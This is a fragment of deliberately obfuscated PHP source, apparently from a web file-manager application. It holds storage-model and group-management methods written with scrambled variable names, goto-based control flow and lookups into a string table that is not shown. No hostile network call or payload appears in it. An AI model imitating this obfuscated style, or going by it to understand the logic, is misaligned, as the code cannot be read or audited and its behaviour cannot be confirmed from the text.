$F¥ÜèàÁÓ” = $this->createFileName($A ¶’Ú¶ÎÕ); $D⁄Ÿ™ﬂÓ≈Â = get_path_father($F¥ÜèàÁÓ”); goto fâ¶¶∂µåÉ; d—ƒ∑¨îë÷: } public function addFileCheckExist($dá◊á±É…∂, $d•£ˆê¢≤Í, $Cœ≤ôà¨⁄Ì) { $EÙêäêÊÜÇ =& $_SERVER[¯èãÄπµ]; $Aú—ôÂµ‘Ü = $this->findByHash($dá◊á±É…∂, $d•£ˆê¢≤Í); if (!$Aú—ôÂµ‘Ü) { return !1; } $D±®∏Ùõ´Ñ = array($EÙêäêÊÜÇ[2141] => intval($Aú—ôÂµ‘Ü[$EÙêäêÊÜÇ[2144]]) + 1, $EÙêäêÊÜÇ[516] => $Cœ≤ôà¨⁄Ì); $this->where(array($EÙêäêÊÜÇ[416] => $Aú—ôÂµ‘Ü[$EÙêäêÊÜÇ[415]]))->save($D±®∏Ùõ´Ñ); return $Aú—ôÂµ‘Ü; } public function remove($A©∆ƒ”äÎÖ) { $this->linkCountChange($A©∆ƒ”äÎÖ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Dö©çª–µà) { $this->linkCountChange($Dö©çª–µà, !0); } public function linkCountChange($Eã¬ãÑƒÁ÷, $fãöˆ•“˜–) { goto b€πïä©≥∑; E·÷ÚÇäπ÷: foreach ($bÀ´’Ø£Æ≤ as $a°π˘÷ó’ã => $dß…Ïˆªáí) { $A©ñﬂªèµÒ = $dß…Ïˆªáí . $f¯•Ñ‹†öö[33]; if (!$aôá¶»ûÉ…[$A©ñﬂªèµÒ]) { $aôá¶»ûÉ…[$A©ñﬂªèµÒ] = array(); } $aôá¶»ûÉ…[$A©ñﬂªèµÒ][] = $a°π˘÷ó’ã; } foreach ($aôá¶»ûÉ… as $dß…Ïˆªáí => $BÂ®Ó¥ç∑Á) { if (!$BÂ®Ó¥ç∑Á) { continue; } $dß…Ïˆªáí = $fãöˆ•“˜– ? $dß…Ïˆªáí : -intval($dß…Ïˆªáí); $D∏ø‹ûΩãî = array($f¯•Ñ‹†öö[415] => array($f¯•Ñ‹†öö[7], $BÂ®Ó¥ç∑Á)); if ($dß…Ïˆªáí < 0) { $D∏ø‹ûΩãî[$f¯•Ñ‹†öö[2144]] = array($f¯•Ñ‹†öö[933], abs($dß…Ïˆªáí)); } $this->where($D∏ø‹ûΩãî)->setAdd($f¯•Ñ‹†öö[2144], $dß…Ïˆªáí); } goto c’è≤≠œúÈ; d¬öºÉ…¿ò: $bÀ´’Ø£Æ≤ = array(); foreach ($Eã¬ãÑƒÁ÷ as $a°π˘÷ó’ã) { $A©ñﬂªèµÒ = $a°π˘÷ó’ã . $f¯•Ñ‹†öö[33]; if (!$bÀ´’Ø£Æ≤[$A©ñﬂªèµÒ]) { $bÀ´’Ø£Æ≤[$A©ñﬂªèµÒ] = 0; } $bÀ´’Ø£Æ≤[$A©ñﬂªèµÒ]++; } $aôá¶»ûÉ… = array(); goto E·÷ÚÇäπ÷; b€πïä©≥∑: $f¯•Ñ‹†öö =& $_SERVER[¯èãÄπµ]; if (!$Eã¬ãÑƒÁ÷) { return; } if (!is_array($Eã¬ãÑƒÁ÷)) { $Eã¬ãÑƒÁ÷ = array($Eã¬ãÑƒÁ÷); } goto d¬öºÉ…¿ò; c’è≤≠œúÈ: } public function findByHash($AºÒÍçë»‰, $B’Áù†ÿÉü = false) { $Dﬁ·Ë‡¯∂∏ =& $_SERVER[¯èãÄπµ]; if (!$AºÒÍçë»‰ && !$B’Áù†ÿÉü) { return !1; } $b¯Ö∆∫–ªú = array($Dﬁ·Ë‡¯∂∏[2142] => $AºÒÍçë»‰); if ($B’Áù†ÿÉü) { $b¯Ö∆∫–ªú = array($Dﬁ·Ë‡¯∂∏[2143] => $B’Áù†ÿÉü); } return $this->order($Dﬁ·Ë‡¯∂∏[2145])->where($b¯Ö∆∫–ªú)->find(); } public function clearEmpty($b⁄®Ò÷∆É¶ = 0) { goto cÂÛæ¬¬â∞; aÛ≥òÍ≥Û◊: foreach ($Cä·âöÕ•√ as $c∑ÏøúÜ⁄ù) { $b≤›Æ†Ü†->update(1); $this->resetFile($c∑ÏøúÜ⁄ù); } $b≤›Æ†Ü†->end(); goto Aªê¥å›¨µ; cÂÛæ¬¬â∞: $d’Ó∫§µÌµ =& $_SERVER[¯èãÄπµ]; $Bπ∆¨„◊Ë’ = time() - 3600 * 24 * $b⁄®Ò÷∆É¶; $bÂåíîû∏≥ = $d’Ó∫§µÌµ[2146] . $Bπ∆¨„◊Ë’; goto aÏÌ§âÑ√≠; aÏÌ§âÑ√≠: $Cä·âöÕ•√ = $this->where($bÂåíîû∏≥)->select(); if (!$Cä·âöÕ•√) { return; } $b≤›Æ†Ü† = new Task($d’Ó∫§µÌµ[2147], $d’Ó∫§µÌµ[33], count($Cä·âöÕ•√)); goto aÛ≥òÍ≥Û◊; Aªê¥å›¨µ: } private function resetFile($d¶àÊ˜Ò◊û) { goto a˜£·ãÀã; côÚ÷Ö´‰»: $D⁄ÕÛÖ˘Ÿç = Model($A¿ã≥åúÜã[2148])->where($féãÃºÚ∏)->count(); $AË„«®ÑèÕ = intval($eÒ•¡ŒˆÚÃ) + intval($D⁄ÕÛÖ˘Ÿç); if ($AË„«®ÑèÕ == 0) { IO::remove($d¶àÊ˜Ò◊û[$A¿ã≥åúÜã[75]]); $this->where($féãÃºÚ∏)->delete(); $this->metaSet($d¶àÊ˜Ò◊û[$A¿ã≥åúÜã[415]], null, null); return; } goto b˘Ê„πçÓ£; a˜£·ãÀã: $A¿ã≥åúÜã =& $_SERVER[¯èãÄπµ]; $féãÃºÚ∏ = array($A¿ã≥åúÜã[416] => $d¶àÊ˜Ò◊û[$A¿ã≥åúÜã[415]]); $eÒ•¡ŒˆÚÃ = Model($A¿ã≥åúÜã[1112])->where($féãÃºÚ∏)->count(); goto côÚ÷Ö´‰»; b˘Ê„πçÓ£: if ($d¶àÊ˜Ò◊û[$A¿ã≥åúÜã[2144]] != $AË„«®ÑèÕ) { $this->where($féãÃºÚ∏)->save(array($A¿ã≥åúÜã[2141] => $AË„«®ÑèÕ)); } goto f€û“ÇÆ∞•; f€û“ÇÆ∞•: } public function storageInfo($Fûâ€ÆàìÁ = false) { goto E®≠ôÑπ◊ë; Bã≤”›ñﬁ¿: $fñˆ†•”‘• = 1; $d«˜∂ÜÑã¢ = 0; $b“Î¥’π◊¥ = 5000; goto DüÂó–ë√÷; DüÂó–ë√÷: for ($Aª≠âÎáí’ = 0; $Aª≠âÎáí’ < $e≈È¡È§…â; $Aª≠âÎáí’ = $Aª≠âÎáí’ + $b“Î¥’π◊¥) { $Fàª®Ë≠å¨ = $this->limit($Aª≠âÎáí’, $Aª≠âÎáí’ + $b“Î¥’π◊¥)->select(); foreach ($Fàª®Ë≠å¨ as $cª≈°çÓ◊É) { $fñˆ†•”‘• += $cª≈°çÓ◊É[$e•ØÑƒ≈√é[77]] * $cª≈°çÓ◊É[$e•ØÑƒ≈√é[2144]]; $d¬¨è°≠√Û += $cª≈°çÓ◊É[$e•ØÑƒ≈√é[77]] * ($cª≈°çÓ◊É[$e•ØÑƒ≈√é[2144]] - 1); $d«˜∂ÜÑã¢ += $cª≈°çÓ◊É[$e•ØÑƒ≈√é[2144]]; } } $B‰ú—∑≥™– = array($e•ØÑƒ≈√é[2149] => $fñˆ†•”‘•, $e•ØÑƒ≈√é[2150] => $d¬¨è°≠√Û, $e•ØÑƒ≈√é[2151] => $d¬¨è°≠√Û / $fñˆ†•”‘•, $e•ØÑƒ≈√é[81] => $e≈È¡È§…â, $e•ØÑƒ≈√é[2152] => $d«˜∂ÜÑã¢); return $B‰ú—∑≥™–; goto BôÀ∞¨ˆ∏ë; E®≠ôÑπ◊ë: $e•ØÑƒ≈√é =& $_SERVER[¯èãÄπµ]; $e≈È¡È§…â = $this->count() + 0.0; $d¬¨è°≠√Û = 0; goto Bã≤”›ñﬁ¿; BôÀ∞¨ˆ∏ë: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\160"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\141\x6d\x65" => "\x67\x72\x6f\x75\160\137\x6d\x65\164\x61", "\x6d\145\164\141\x46\x69\x65\x6c\x64" => "\147\x72\x6f\x75\160\x49\104"); protected function cacheFunctionAlias($D™¿ıâÙ◊Ü) { $aÑóúÁàÉà =& $_SERVER[¯èãÄπµ]; return array($aÑóúÁàÉà[2153] => array($D™¿ıâÙ◊Ü[0], $aÑóúÁàÉà[2154]), $aÑóúÁàÉà[2155] => array($D™¿ıâÙ◊Ü[0], $aÑóúÁàÉà[2154])); } protected function getInfo($f◊ÍåÇ◊ô¿) { $fÉâ∏π•Ö€ = $this->getInfoSimple($f◊ÍåÇ◊ô¿); if (!$fÉâ∏π•Ö€) { return !1; } return $this->_listDataApplyItem($fÉâ∏π•Ö€); } protected function getInfoSimple($DêÈø‰ú”, $B°öÍµóÒ¥ = false) { $a§ªÚÃ™ÿ≠ =& $_SERVER[¯èãÄπµ]; if ($B°öÍµóÒ¥) { $Fêáœª÷≠† = array($a§ªÚÃ™ÿ≠[2087] => intval($DêÈø‰ú”)); $e‹ÿ®•¶òπ = $this->where($Fêáœª÷≠†)->find(); return is_array($e‹ÿ®•¶òπ) ? $e‹ÿ®•¶òπ : array(); } return $this->cacheFunctionGet($a§ªÚÃ™ÿ≠[2156], $DêÈø‰ú”); } protected function groupAdd($f˜ÈíÜ‚–¶) { goto AÎã·º»Óû; dÕ∑ï‘ƒ¨Ñ: Model($dü ˆÕ◊‰‡[1112])->groupRootAdd($fÁÜëïÒ¡∞); return $fÁÜëïÒ¡∞; goto b√óƒ™Ç•ﬂ; Dâãä¨Òúö: if ($f·ÙâøÁø∏[$dü ˆÕ◊‰‡[455]]) { $d¡◊§π›çâ = $f·ÙâøÁø∏[$dü ˆÕ◊‰‡[455]] . $f·ÙâøÁø∏[$dü ˆÕ◊‰‡[2087]] . $dü ˆÕ◊‰‡[47]; } $AÇåÖï´‘ = array($dü ˆÕ◊‰‡[382] => $this->groupNameAuto($f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[457]], $f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[28]]), $dü ˆÕ◊‰‡[364] => $f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[457]], $dü ˆÕ◊‰‡[521] => $d¡◊§π›çâ, $dü ˆÕ◊‰‡[2157] => $f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[2071]], $dü ˆÕ◊‰‡[2158] => 0, $dü ˆÕ◊‰‡[2091] => 0); if (isset($f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[2108]])) { $AÇåÖï´‘[$dü ˆÕ◊‰‡[2108]] = $f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[2108]]; } else { $eÎª‰âÕ¥◊ = $this->max($dü ˆÕ◊‰‡[2108]); if (!$eÎª‰âÕ¥◊) { $eÎª‰âÕ¥◊ = 0; } $AÇåÖï´‘[$dü ˆÕ◊‰‡[2108]] = $eÎª‰âÕ¥◊ + 1; } goto Aœ“·íÇ›Û; AÎã·º»Óû: $dü ˆÕ◊‰‡ =& $_SERVER[¯èãÄπµ]; if (!$f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[457]] && isset($f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[2087]]) && $f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[2087]] == 1) { if ($f·ÙâøÁø∏ = $this->getInfoSimple($f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[2087]], !0)) { return $f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[2087]]; } } else { $f·ÙâøÁø∏ = $this->getInfoSimple($f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[457]]); if (!$f·ÙâøÁø∏) { return !1; } } $d¡◊§π›çâ = $dü ˆÕ◊‰‡[466]; goto Dâãä¨Òúö; Aœ“·íÇ›Û: if (!empty($f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[2087]])) { $AÇåÖï´‘[$dü ˆÕ◊‰‡[2087]] = $f˜ÈíÜ‚–¶[$dü ˆÕ◊‰‡[2087]]; } $fÁÜëïÒ¡∞ = $this->add($AÇåÖï´‘); $this->setNamePinyin($fÁÜëïÒ¡∞, $AÇåÖï´‘[$dü ˆÕ◊‰‡[28]]); goto dÕ∑ï‘ƒ¨Ñ; b√óƒ™Ç•ﬂ: } protected function groupEdit($e™çú´∞´œ, $EÒãµ–éæî) { $bûå∫π∞Ñ¡ =& $_SERVER[¯èãÄπµ]; if (!empty($EÒãµ–éæî[$bûå∫π∞Ñ¡[457]])) { $cƒ‹ºâ©≤“ = $this->getInfoSimple($e™çú´∞´œ); $Bà∆Óû¶ƒƒ = $this->getInfoSimple($EÒãµ–éæî[$bûå∫π∞Ñ¡[457]]); if (!$cƒ‹ºâ©≤“ || !$Bà∆Óû¶ƒƒ) { return !1; } if ($cƒ‹ºâ©≤“[$bûå∫π∞Ñ¡[2087]] == $Bà∆Óû¶ƒƒ[$bûå∫π∞Ñ¡[2087]]) { return !1; } if ($EÒãµ–éæî[$bûå∫π∞Ñ¡[457]] != $cƒ‹ºâ©≤“[$bûå∫π∞Ñ¡[457]]) { if ($Bà∆Óû¶ƒƒ[$bûå∫π∞Ñ¡[455]] !== $cƒ‹ºâ©≤“[$bûå∫π∞Ñ¡[455]] && strpos($Bà∆Óû¶ƒƒ[$bûå∫π∞Ñ¡[455]], $cƒ‹ºâ©≤“[$bûå∫π∞Ñ¡[455]] . $cƒ‹ºâ©≤“[$bûå∫π∞Ñ¡[2087]] . $bûå∫π∞Ñ¡[47]) === 0) { return !1; } $EÒãµ–éæî[$bûå∫π∞Ñ¡[521]] = $Bà∆Óû¶ƒƒ[$bûå∫π∞Ñ¡[455]] . $EÒãµ–éæî[$bûå∫π∞Ñ¡[457]] . $bûå∫π∞Ñ¡[47]; $this->_changeChildLevel($cƒ‹ºâ©≤“, $Bà∆Óû¶ƒƒ); } } if (isset($EÒãµ–éæî[$bûå∫π∞Ñ¡[28]])) { $this->setNamePinyin($e™çú´∞´œ, $EÒãµ–éæî[$bûå∫π∞Ñ¡[28]]); } return $this->where(array($bûå∫π∞Ñ¡[2159] => $e™çú´∞´œ))->save($EÒãµ–éæî); } private function _changeChildLevel($Aû°π°ÚèÚ, $EÆ•ÌäüåÀ, $E≥ñöÓ¡Ïˆ = false) { goto a•ˆ¨–ﬁÊÑ; a•ˆ¨–ﬁÊÑ: $f∆“ Ω©àË =& $_SERVER[¯èãÄπµ]; $Då˜îêí–• = $Aû°π°ÚèÚ[$f∆“ Ω©àË[455]] . $Aû°π°ÚèÚ[$f∆“ Ω©àË[2087]] . $f∆“ Ω©àË[47]; $E±©√Ü∂ËÖ = $EÆ•ÌäüåÀ[$f∆“ Ω©àË[455]] . $EÆ•ÌäüåÀ[$f∆“ Ω©àË[2087]] . $f∆“ Ω©àË[47] . $Aû°π°ÚèÚ[$f∆“ Ω©àË[2087]] . $f∆“ Ω©àË[47]; goto c®‘õèÜ•∑; c®‘õèÜ•∑: if ($E≥ñöÓ¡Ïˆ) { $E±©√Ü∂ËÖ = $EÆ•ÌäüåÀ[$f∆“ Ω©àË[455]] . $EÆ•ÌäüåÀ[$f∆“ Ω©àË[2087]] . $f∆“ Ω©àË[47]; } $B¥ÊπßÎà∞ = array($f∆“ Ω©àË[521] => array($f∆“ Ω©àË[479], $Aû°π°ÚèÚ[$f∆“ Ω©àË[455]] . $Aû°π°ÚèÚ[$f∆“ Ω©àË[2087]] . $f∆“ Ω©àË[480])); $E„±∂´∑ªÜ = array($f∆“ Ω©àË[521] => array($f∆“ Ω©àË[530], "\x72\x65\160\x6c\x61\x63\145\50\x70\141\162\145\156\164\114\x65\x76\145\154\54\x27{$Då˜îêí–•}\47\x2c\x27{$E±©√Ü∂ËÖ}\x27\51")); goto dÔÜóÖŒÕÁ; dÔÜóÖŒÕÁ: $this->where($B¥ÊπßÎà∞)->data($E„±∂´∑ªÜ)->save(); goto DŸªñãıœè; DŸªñãıœè: } public function setNamePinyin($CÑ•‰Éë¢¯, $aêﬁ£∑—Úå = false) { $cêÉ¿µäÔ‹ =& $_SERVER[¯èãÄπµ]; if (!$aêﬁ£∑—Úå) { $b¯á‹Éïì¬ = $this->getInfoSimple($CÑ•‰Éë¢¯); $aêﬁ£∑—Úå = $b¯á‹Éïì¬[$cêÉ¿µäÔ‹[28]]; } if (!Input::check($aêﬁ£∑—Úå, $cêÉ¿µäÔ‹[524])) { $this->metaSet($CÑ•‰Éë¢¯, $cêÉ¿µäÔ‹[412], null); $this->metaSet($CÑ•‰Éë¢¯, $cêÉ¿µäÔ‹[411], null); return; } $a‹å—Ö⁄ôŒ = array($cêÉ¿µäÔ‹[412] => str_replace($cêÉ¿µäÔ‹[50], $cêÉ¿µäÔ‹[33], Pinyin::encode($aêﬁ£∑—Úå)), $cêÉ¿µäÔ‹[411] => Pinyin::encode($aêﬁ£∑—Úå, $cêÉ¿µäÔ‹[525])); $this->metaSet($CÑ•‰Éë¢¯, $a‹å—Ö⁄ôŒ); } protected function groupStatus($fºê™±èè◊, $d¨ËﬂﬁÁ≠ú, $e†¨≠äÖÈÜ = true) { $B¶ïÒ‰®◊ü =& $_SERVER[¯èãÄπµ]; $d›Œü¡⁄«± = $this->getInfoSimple($fºê™±èè◊); if (!$d›Œü¡⁄«±) { return !1; } if ($e†¨≠äÖÈÜ) { $this->_groupStatusApply($d›Œü¡⁄«±, $d¨ËﬂﬁÁ≠ú); } $cƒ‹…¢¢ëÒ = array($B¶ïÒ‰®◊ü[2087] => $fºê™±èè◊, $B¶ïÒ‰®◊ü[89] => $B¶ïÒ‰®◊ü[692], $B¶ïÒ‰®◊ü[355] => $d¨ËﬂﬁÁ≠ú); return Model($B¶ïÒ‰®◊ü[2160])->add($cƒ‹…¢¢ëÒ, array(), !0); } private function _groupStatusApply($bª¥É›∂Œë, $F™Í≈§”™Ô) { $E—√âˆéÖï =& $_SERVER[¯èãÄπµ]; if ($F™Í≈§”™Ô == $E—√âˆéÖï[83]) { $aâ∞Ò˜ñÏá = $this->parentLevelArray($bª¥É›∂Œë[$E—√âˆéÖï[455]]); } else { $cÉ†œå—ãÔ = array($E—√âˆéÖï[521] => array($E—√âˆéÖï[479], $bª¥É›∂Œë[$E—√âˆéÖï[455]] . $bª¥É›∂Œë[$E—√âˆéÖï[2087]] . $E—√âˆéÖï[480])); $aâ∞Ò˜ñÏá = $this->where($cÉ†œå—ãÔ)->field($E—√âˆéÖï[2087])->select(); $aâ∞Ò˜ñÏá = array_to_keyvalue($aâ∞Ò˜ñÏá, $E—√âˆéÖï[33], $E—√âˆéÖï[2087]); } if (empty($aâ∞Ò˜ñÏá)) { return; } $cÉ†œå—ãÔ = array($E—√âˆéÖï[2087] => array($E—√âˆéÖï[7], $aâ∞Ò˜ñÏá), $E—√âˆéÖï[89] => $E—√âˆéÖï[692], $E—√âˆéÖï[355] => $F™Í≈§”™Ô ? $E—√âˆéÖï[464] : $E—√âˆéÖï[83]); Model($E—√âˆéÖï[2160])->where($cÉ†œå—ãÔ)->save(array($E—√âˆéÖï[355] => $F™Í≈§”™Ô)); } protected function groupRemove($e¡⁄≤í–ñÕ) { goto Bñ∫¬ÁŒ·è; fªªàﬂì¥ø: $this->where(array($fµä•ºÑÈÒ[457] => $e¡⁄≤í–ñÕ))->save(array($fµä•ºÑÈÒ[457] => $b˜É‰Ï¶Ωÿ[$fµä•ºÑÈÒ[457]])); Model($fµä•ºÑÈÒ[2160])->where($EáÈúëı∂æ)->delete(); Model($fµä•ºÑÈÒ[2161])->where($EáÈúëı∂æ)->delete(); goto EËæıª©œæ; FÈÉ¢ÑÒ◊‘: if (!$b˜É‰Ï¶Ωÿ || $b˜É‰Ï¶Ωÿ[$fµä•ºÑÈÒ[457]] == 0) { return !1; } $bƒŸá©∞öˆ = $this->getInfoSimple($b˜É‰Ï¶Ωÿ[$fµä•ºÑÈÒ[457]]); $this->_changeChildLevel($b˜É‰Ï¶Ωÿ, $bƒŸá©∞öˆ, !0); goto fªªàﬂì¥ø; Bñ∫¬ÁŒ·è: $fµä•ºÑÈÒ =& $_SERVER[¯èãÄπµ]; $EáÈúëı∂æ = array($fµä•ºÑÈÒ[2087] => $e¡⁄≤í–ñÕ); $b˜É‰Ï¶Ωÿ = $this->where($EáÈúëı∂æ)->find(); goto FÈÉ¢ÑÒ◊‘; EËæıª©œæ: Model($fµä•ºÑÈÒ[755])->groupRootRemove($e¡⁄≤í–ñÕ); return $this->where($EáÈúëı∂æ)->delete(); goto E‹˜·ΩΩ®ã; E‹˜·ΩΩ®ã: } public function listData() { $e÷√í–îßŒ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($e÷√í–îßŒ[$_SERVER[¯èãÄπµ][350]]); return $e÷√í–îßŒ; } private function _makeOrder($Aã’çÖªâ = '') { goto Bâ™∞áëÀó; a√—ﬁœ¡◊∑: $CéÍÇÀ¨ê¥ = Input::get($F›¨‘íΩœ[403], $F›¨‘íΩœ[7], $F›¨‘íΩœ[2091], $cåÑÙ»ƒõ·); $e∏ìÂà√”ÿ = Input::get($F›¨‘íΩœ[404], $F›¨‘íΩœ[7], $F›¨‘íΩœ[2162], array($F›¨‘íΩœ[2162], $F›¨‘íΩœ[400])); $e∏ìÂà√”ÿ = $Aä¶é¥öúÉ[$e∏ìÂà√”ÿ]; goto C‘¡¡ÍåÏÙ; Bâ™∞áëÀó: $F›¨‘íΩœ =& $_SERVER[¯èãÄπµ]; $cåÑÙ»ƒõ· = array($F›¨‘íΩœ[2087], $F›¨‘íΩœ[28], $F›¨‘íΩœ[2073], $F›¨‘íΩœ[183]); $Aä¶é¥öúÉ = array($F›¨‘íΩœ[398] => $F›¨‘íΩœ[399], $F›¨‘íΩœ[400] => $F›¨‘íΩœ[401]); goto a√—ﬁœ¡◊∑; C‘¡¡ÍåÏÙ: $Aã’çÖªâ = $Aã’çÖªâ . "{$CéÍÇÀ¨ê¥}\40{$e∏ìÂà√”ÿ}\54\x20\x67\x72\157\165\x70\x49\x44\x20\x61\163\143"; return $this->order($Aã’çÖªâ); goto Düó®µÆÂ√; Düó®µÆÂ√: } public function listChild($F∂âÁÌ£√≥) { $Fè∫∞Íü≠± =& $_SERVER[¯èãÄπµ]; $eù·Ó∫†Ô√ = $this->where(array($Fè∫∞Íü≠±[457] => $F∂âÁÌ£√≥))->_makeOrder()->selectPage(200); $this->_listDataApply($eù·Ó∫†Ô√[$Fè∫∞Íü≠±[350]]); return $eù·Ó∫†Ô√; } public function listByID($FÇŒû≥Ü›Æ) { $CΩ∞Îœ˘≠´ =& $_SERVER[¯èãÄπµ]; if (!$FÇŒû≥Ü›Æ) { return array(); } $FÉ∑ Û◊Øƒ = array($CΩ∞Îœ˘≠´[2087] => array($CΩ∞Îœ˘≠´[7], $FÇŒû≥Ü›Æ)); $f√Ωé¬Ã¥á = $this->where($FÉ∑ Û◊Øƒ)->select(); $this->_listDataApply($f√Ωé¬Ã¥á); return $f√Ωé¬Ã¥á; } public function listSearch($Bã⁄∏‹¯Òµ) { goto A©áÓØºıô; DΩì±ú§Òõ: $CÆˆ„÷Éô∞ = $this->_makeOrder()->where($bòü±œÖ¨Ò)->selectPage(20); $CÆˆ„÷Éô∞ = $CÆˆ„÷Éô∞ ? $CÆˆ„÷Éô∞ : array(); if (!$CÆˆ„÷Éô∞ || count($CÆˆ„÷Éô∞[$cﬁﬁã•á¥…[350]]) < 5 && Input::check($bˆüΩÏÌ≤î, $cﬁﬁã•á¥…[302])) { $A…ã⁄ÒöµÎ = $this->_searchFromMeta($cﬁﬁã•á¥…[411], $bˆüΩÏÌ≤î, 10); $AÔıÑâç§â = $this->_searchFromMeta($cﬁﬁã•á¥…[412], $bˆüΩÏÌ≤î, 10); $dËà◊‘öé⁄ = array_merge($A…ã⁄ÒöµÎ, $AÔıÑâç§â, $CÆˆ„÷Éô∞[$cﬁﬁã•á¥…[350]]); $CÆˆ„÷Éô∞[$cﬁﬁã•á¥…[350]] = array_unique_by_key($dËà◊‘öé⁄, $cﬁﬁã•á¥…[2087]); $CÆˆ„÷Éô∞[$cﬁﬁã•á¥…[347]][$cﬁﬁã•á¥…[348]] = count($CÆˆ„÷Éô∞[$cﬁﬁã•á¥…[350]]); $CÆˆ„÷Éô∞[$cﬁﬁã•á¥…[347]][$cﬁﬁã•á¥…[349]] = ceil($CÆˆ„÷Éô∞[$cﬁﬁã•á¥…[347]][$cﬁﬁã•á¥…[348]] / $CÆˆ„÷Éô∞[$cﬁﬁã•á¥…[347]][$cﬁﬁã•á¥…[345]]); } goto f Ÿêª®ÊÚ; E∆Ωä¿Ú¢‘: if (!trim($bˆüΩÏÌ≤î)) { return !1; } $bˆüΩÏÌ≤î = str_replace($cﬁﬁã•á¥…[2165], $cﬁﬁã•á¥…[2166], $bˆüΩÏÌ≤î); $bòü±œÖ¨Ò = array($cﬁﬁã•á¥…[2087] => array($cﬁﬁã•á¥…[754], "\x25{$bˆüΩÏÌ≤î}\45"), $cﬁﬁã•á¥…[28] => array($cﬁﬁã•á¥…[754], "\45{$bˆüΩÏÌ≤î}\x25"), $cﬁﬁã•á¥…[918] => $cﬁﬁã•á¥…[2167]); goto DΩì±ú§Òõ; A©áÓØºıô: $cﬁﬁã•á¥… =& $_SERVER[¯èãÄπµ]; $bˆüΩÏÌ≤î = $Bã⁄∏‹¯Òµ[$cﬁﬁã•á¥…[2163]]; $d‹’äÛı‡œ = isset($Bã⁄∏‹¯Òµ[$cﬁﬁã•á¥…[2164]]) ? $Bã⁄∏‹¯Òµ[$cﬁﬁã•á¥…[2164]] : !1; goto E∆Ωä¿Ú¢‘; f Ÿêª®ÊÚ: $this->_listDataApply($CÆˆ„÷Éô∞[$cﬁﬁã•á¥…[350]]); return $CÆˆ„÷Éô∞; goto aó´ÏìçÇÃ; aó´ÏìçÇÃ: } private function _searchFromMeta($aÇÓ„·â§¬, $F€∞ó«é› , $fªÇˆ¨ª∫Ô) { goto B˘Ø∏ı∂‹ı; B˘Ø∏ı∂‹ı: $fŸ¡∆Óˆç =& $_SERVER[¯èãÄπµ]; $F€∞ó«é›  = strtolower($F€∞ó«é› ); $aà¿≤áÍäî = array($fŸ¡∆Óˆç[89] => $aÇÓ„·â§¬, $fŸ¡∆Óˆç[355] => array($fŸ¡∆Óˆç[754], "\x25{$F€∞ó«é› }\45")); goto Fûò⁄òáãÚ; fñîÉ±úßº: $aÁó≥õ‰Ω‚ = $this->where(array($fŸ¡∆Óˆç[2159] => array($fŸ¡∆Óˆç[7], $AßÔ–ŸàÃá)))->select(); if (!$aÁó≥õ‰Ω‚) { return array(); } return $aÁó≥õ‰Ω‚; goto eßÒ¨á£ìÕ; Fûò⁄òáãÚ: $AßÔ–ŸàÃá = Model($fŸ¡∆Óˆç[2168])->where($aà¿≤áÍäî)->limit($fªÇˆ¨ª∫Ô)->select(); if (!$AßÔ–ŸàÃá) { return array(); } $AßÔ–ŸàÃá = array_to_keyvalue($AßÔ–ŸàÃá, $fŸ¡∆Óˆç[33], $fŸ¡∆Óˆç[2087]); goto fñîÉ±úßº; eßÒ¨á£ìÕ: } protected function _listDataApplyItem($D‚Ö»Ò˜•˘) { $dîíóÏÓÜå = array($D‚Ö»Ò˜•˘); $this->_listDataApply($dîíóÏÓÜå); return $dîíóÏÓÜå[0]; } protected function _listDataApply(&$dÛÜÔπı»•) { goto Eüóé∞‡Ô¬; FÖá⁄…ö∏˘: $this->_listAppendChildren($dÛÜÔπı»•); $this->_listAppendChildrenMember($dÛÜÔπı»•); $this->_listAppendMeta($dÛÜÔπı»•, $DœˆÇëÖá÷); goto c›Ò∏¢â‰Ú; Eüóé∞‡Ô¬: $C¿ÿúÔ•´Ô =& $_SERVER[¯èãÄπµ]; if (!$dÛÜÔπı»•) { return; } $DœˆÇëÖá÷ = array_to_keyvalue($dÛÜÔπı»•, $C¿ÿúÔ•´Ô[33], $C¿ÿúÔ•´Ô[2087]); goto FÖá⁄…ö∏˘; c›Ò∏¢â‰Ú: $this->_listAppendParent($dÛÜÔπı»•); $this->_listAppendSourceRoot($dÛÜÔπı»•, $DœˆÇëÖá÷); goto EÖ¿á‚Ãèâ; EÖ¿á‚Ãèâ: } private function _listAppendChildren(&$cÍêÑΩÒÉé) { goto D•›–ı˘ä√; D•›–ı˘ä√: $b±∂öÖïÿ≠ =& $_SERVER[¯èãÄπµ]; $EòµÖøŒπª = $b±∂öÖïÿ≠[357]; $EÿéÛ˘ãÍè = array(); goto B∏ÌüÁ⁄¨⁄; B∏ÌüÁ⁄¨⁄: $b•„‚´øô∏ = count($cÍêÑΩÒÉé); $bæò¬„›ù = $this->tablePrefix . $this->tableName; for ($d„≥˜—≠ùﬁ = 0, $Fëç≈∂¡πØ = 0; $d„≥˜—≠ùﬁ < $b•„‚´øô∏; $d„≥˜—≠ùﬁ++) { $Fëç≈∂¡πØ++; $D’ãØŒØêŒ = $cÍêÑΩÒÉé[$d„≥˜—≠ùﬁ][$b±∂öÖïÿ≠[2087]]; $EòµÖøŒπª .= 